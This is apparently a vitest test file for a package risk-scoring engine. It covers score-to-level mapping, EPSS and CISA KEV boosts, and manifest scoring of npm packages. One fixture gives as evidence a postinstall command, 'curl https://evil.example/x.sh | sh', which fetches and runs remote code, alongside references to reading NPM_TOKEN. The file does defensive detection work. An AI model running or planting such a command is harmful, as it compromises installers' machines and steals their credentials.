import { describe, expect, it } from "vitest";

import { emptyBehaviorSummary, emptyScriptThreatSummary, sampleAnalyses } from "@binshield/analysis-types";
import type { ManifestAnalysis } from "@binshield/analysis-types";
import {
  aggregatePackageRisk,
  aggregatePackageRiskWithManifest,
  buildCisaKevFindings,
  cisaKevBoost,
  epssBoost,
  riskLevelFromScore,
  scoreBinary,
  scoreManifest
} from "./index";
import type { CisaKevContext, EpssContext } from "./index";

function makeManifest(overrides: Partial<ManifestAnalysis> = {}): ManifestAnalysis {
  return {
    id: "manifest_test",
    ecosystem: "npm",
    lifecycleHooks: {},
    hasInstallScripts: false,
    analyzedFiles: [],
    riskScore: 0,
    riskLevel: "none",
    threats: emptyScriptThreatSummary(),
    findings: [],
    knownMalwareAdvisoryIds: [],
    sourceMatchConfidence: "medium",
    analyzedAt: "2026-05-21T00:00:00.000Z",
    ...overrides
  };
}

describe("risk engine", () => {
  it("maps scores to levels", () => {
    expect(riskLevelFromScore(0)).toBe("none");
    expect(riskLevelFromScore(12)).toBe("low");
    expect(riskLevelFromScore(34)).toBe("medium");
    expect(riskLevelFromScore(65)).toBe("high");
    expect(riskLevelFromScore(91)).toBe("critical");
  });

  it("scores suspicious behaviors above benign ones", () => {
    const low = scoreBinary({
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 4,
      functionCount: 20
    });
    const high = scoreBinary({
      behaviors: {
        ...emptyBehaviorSummary(),
        network: { detected: true, details: ["Connects to remote host"] },
        dataExfiltration: { detected: true, details: ["Uploads environment variables"] },
        obfuscation: { detected: true, details: ["Encrypted strings"] }
      },
      findings: [
        {
          severity: "critical",
          title: "Outbound exfiltration",
          description: "Sends data to an unknown domain",
          recommendation: "Block package"
        }
      ],
      importCount: 18,
      functionCount: 52
    });

    expect(high.riskScore).toBeGreaterThan(low.riskScore);
    expect(high.riskLevel).toBe("critical");
  });

  it("aggregates package risk from binaries", () => {
    const aggregate = aggregatePackageRisk(sampleAnalyses[0].binaries);
    expect(aggregate.riskScore).toBeGreaterThan(0);
    expect(aggregate.riskLevel).toBe("low");
  });

  it("scores a malicious install script even when the package has no binaries", () => {
    const manifest = makeManifest({
      hasInstallScripts: true,
      threats: {
        ...emptyScriptThreatSummary(),
        remoteCodeExecution: { detected: true, details: ["postinstall pipes curl into a shell"] },
        environmentTheft: { detected: true, details: ["reads process.env.NPM_TOKEN"] }
      },
      findings: [
        {
          category: "remoteCodeExecution",
          severity: "critical",
          title: "Remote code execution in postinstall hook",
          description: "postinstall hook downloads and executes remote code at install time",
          filePath: "package.json#scripts.postinstall",
          evidence: "curl https://evil.example/x.sh | sh",
          lifecycleHook: "postinstall",
          recommendation: "Do not install this package."
        }
      ]
    });

    const score = scoreManifest(manifest);
    expect(score.riskScore).toBeGreaterThan(0);
    expect(score.riskLevel).toBe("critical");

    // The old binary-only path returns "none" for a package with no binaries —
    // this is the gap the manifest path closes.
    expect(aggregatePackageRisk([]).riskLevel).toBe("none");
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("forces a critical verdict for known-malware matches", () => {
    const manifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(manifest)).toEqual({ riskScore: 100, riskLevel: "critical" });
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("takes the max of binary and manifest risk, never diluting either", () => {
    const cleanManifest = makeManifest();
    const binaryOnly = aggregatePackageRisk(sampleAnalyses[0].binaries);
    const merged = aggregatePackageRiskWithManifest(sampleAnalyses[0].binaries, cleanManifest);
    expect(merged.riskScore).toBe(binaryOnly.riskScore);
  });
});

describe("EPSS boost", () => {
  it("returns 0 when no EPSS context is provided", () => {
    expect(epssBoost(undefined)).toBe(0);
  });

  it("returns 0 when percentile is below 0.75", () => {
    expect(epssBoost({ maxEpssPercentile: 0.50 })).toBe(0);
    expect(epssBoost({ maxEpssPercentile: 0.74 })).toBe(0);
  });

  it("returns 15 when percentile is between 0.75 and 0.90", () => {
    expect(epssBoost({ maxEpssPercentile: 0.75 + 0.001 })).toBe(15);
    expect(epssBoost({ maxEpssPercentile: 0.80 })).toBe(15);
    expect(epssBoost({ maxEpssPercentile: 0.90 })).toBe(15);
  });

  it("returns 25 when percentile exceeds 0.90 (exploited in the wild)", () => {
    expect(epssBoost({ maxEpssPercentile: 0.901 })).toBe(25);
    expect(epssBoost({ maxEpssPercentile: 0.99 })).toBe(25);
    expect(epssBoost({ maxEpssPercentile: 1.0 })).toBe(25);
  });

  it("scoreBinary applies EPSS boost on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const withoutEpss = scoreBinary(binary);
    const withLowEpss = scoreBinary(binary, { maxEpssPercentile: 0.50 });
    const withHighEpss = scoreBinary(binary, { maxEpssPercentile: 0.80 });
    const withCriticalEpss = scoreBinary(binary, { maxEpssPercentile: 0.95 });

    // No boost below threshold
    expect(withLowEpss.riskScore).toBe(withoutEpss.riskScore);
    // 15-pt boost above 0.75
    expect(withHighEpss.riskScore).toBe(withoutEpss.riskScore + 15);
    // 25-pt boost above 0.90
    expect(withCriticalEpss.riskScore).toBe(Math.min(100, withoutEpss.riskScore + 25));
  });

  it("scoreBinary with EPSS boost escalates risk level for borderline packages", () => {
    // A low-risk binary (score ~8) should escalate to medium when an EPSS
    // percentile > 0.75 is present (+15 → 23 = medium)
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "low" as const, title: "Minor issue", description: "Minor", recommendation: "Review" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutEpss = scoreBinary(binary);
    expect(withoutEpss.riskLevel).toBe("low");

    const withEpss = scoreBinary(binary, { maxEpssPercentile: 0.85 });
    // 8 + 15 = 23 → still low boundary, depending on base; assert it is higher
    expect(withEpss.riskScore).toBeGreaterThan(withoutEpss.riskScore);
  });

  it("scoreManifest applies EPSS boost while preserving malware-override", () => {
    const cleanManifest = makeManifest();

    const withoutEpss = scoreManifest(cleanManifest);
    const withHighEpss = scoreManifest(cleanManifest, { maxEpssPercentile: 0.80 });
    const withCriticalEpss = scoreManifest(cleanManifest, { maxEpssPercentile: 0.95 });

    expect(withHighEpss.riskScore).toBe(withoutEpss.riskScore + 15);
    expect(withCriticalEpss.riskScore).toBe(Math.min(100, withoutEpss.riskScore + 25));

    // Known-malware still forces 100 even with EPSS context
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, { maxEpssPercentile: 0.95 })).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });
});

// ---------------------------------------------------------------------------
// CISA KEV boost
// ---------------------------------------------------------------------------

function makeKev(overrides: Partial<CisaKevContext> = {}): CisaKevContext {
  return {
    kevMatches: [],
    ...overrides
  };
}

describe("CISA KEV boost", () => {
  it("returns 0 when no KEV context provided", () => {
    expect(cisaKevBoost(undefined)).toBe(0);
  });

  it("returns 0 for empty matches array", () => {
    expect(cisaKevBoost(makeKev())).toBe(0);
  });

  it("returns 0 for proof-of-concept only (no confirmed exploitation)", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-15", exploitMaturity: "proof-of-concept" }]
        })
      )
    ).toBe(0);
  });

  it("returns +20 for active-exploitation match", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-10", exploitMaturity: "active-exploitation" }]
        })
      )
    ).toBe(20);
  });

  it("returns +20 for widespread match (ransomware-level)", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }]
        })
      )
    ).toBe(20);
  });

  it("returns +20 when mix of proof-of-concept and active-exploitation", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [
            { cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" },
            { cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }
          ]
        })
      )
    ).toBe(20);
  });

  it("scoreBinary applies CISA KEV boost on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const noKev = scoreBinary(binary);
    const withPoC = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" }]
    }));
    const withActive = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));

    // PoC does not boost
    expect(withPoC.riskScore).toBe(noKev.riskScore);
    // Active exploitation adds +20
    expect(withActive.riskScore).toBe(noKev.riskScore + 20);
  });

  it("scoreBinary stacks EPSS and CISA KEV boosts independently", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const noBoosts = scoreBinary(binary);
    const epssOnly = scoreBinary(binary, { maxEpssPercentile: 0.80 });
    const kevOnly = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));
    const both = scoreBinary(binary, { maxEpssPercentile: 0.80 }, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));

    expect(epssOnly.riskScore).toBe(noBoosts.riskScore + 15);
    expect(kevOnly.riskScore).toBe(noBoosts.riskScore + 20);
    expect(both.riskScore).toBe(Math.min(100, noBoosts.riskScore + 15 + 20));
  });

  it("scoreManifest applies CISA KEV boost while preserving malware-override", () => {
    const cleanManifest = makeManifest();
    const kev = makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    });

    const withoutKev = scoreManifest(cleanManifest);
    const withKev = scoreManifest(cleanManifest, undefined, kev);

    expect(withKev.riskScore).toBe(withoutKev.riskScore + 20);

    // Known-malware still forces 100 regardless of KEV
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, undefined, kev)).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });
});

// ---------------------------------------------------------------------------
// buildCisaKevFindings
// ---------------------------------------------------------------------------

describe("buildCisaKevFindings", () => {
  it("returns empty array when no KEV context", () => {
    expect(buildCisaKevFindings(undefined)).toEqual([]);
  });

  it("returns empty array when no matches", () => {
    expect(buildCisaKevFindings(makeKev())).toEqual([]);
  });

  it("does not emit findings for proof-of-concept only", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" }]
      })
    );
    expect(findings).toHaveLength(0);
  });

  it("emits CRITICAL finding for active-exploitation", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-10", exploitMaturity: "active-exploitation" }]
      })
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("critical");
    expect(findings[0]!.title).toContain("CVE-Actively-Exploited-In-Wild");
    expect(findings[0]!.title).toContain("CVE-2024-0002");
    expect(findings[0]!.description).toContain("active-exploitation");
    expect(findings[0]!.description).toContain("2024-03-10");
  });

  it("emits CRITICAL finding for widespread (ransomware)", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }]
      })
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("critical");
    expect(findings[0]!.title).toContain("CVE-2024-0003");
  });

  it("emits one finding per active CVE (multiple matches)", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [
          { cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" },
          { cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" },
          { cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }
        ]
      })
    );
    // PoC is excluded; active + widespread = 2 findings
    expect(findings).toHaveLength(2);
    expect(findings.every((f) => f.severity === "critical")).toBe(true);
  });
});
